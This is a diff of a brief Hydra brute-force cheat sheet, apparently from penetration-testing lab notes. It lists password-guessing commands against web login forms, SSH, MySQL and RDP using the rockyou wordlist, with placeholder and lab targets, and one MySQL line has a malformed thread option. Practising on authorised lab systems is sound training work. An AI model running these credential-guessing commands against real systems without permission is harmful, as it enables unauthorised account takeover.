@@ -1,12 +1,10 @@
 ## Brute Force THCHydra
 
-https://en.kali.tools/?p=220
-
 # HTTP Post Web Form
 
 $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
 
-$ hydra -l admin -P /dir/passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+$ hydra -l admin -P /dir/passlist.txt http://example.com  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 $ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.12.183 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
@@ -28,8 +26,6 @@ $ hydra -L <full path to usernamelist.txt> -P <full path to passlist.txt> ssh://
 
 $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t 4 ssh
 
-$ ssh username@<IP Address>
-
 # MySQL
 
 $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t mysql
@@ -41,4 +37,4 @@ $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt <IP Address Target> -t 4 
 # RDP
 $ hydra -l <username> -P <full path to passlist.txt> <IP Address> rdp
 
-$ hydra -L <full path to usernamelist.txt> -P <full path to passlist.txt> -t 4 -W 3 rdp://IP_Address:3389/
+$ hydra -L <full/path_to_usernamelist.txt> -P <full/path_to_passlist.txt> -t 4 -W 3 rdp://IP_Address:3389/
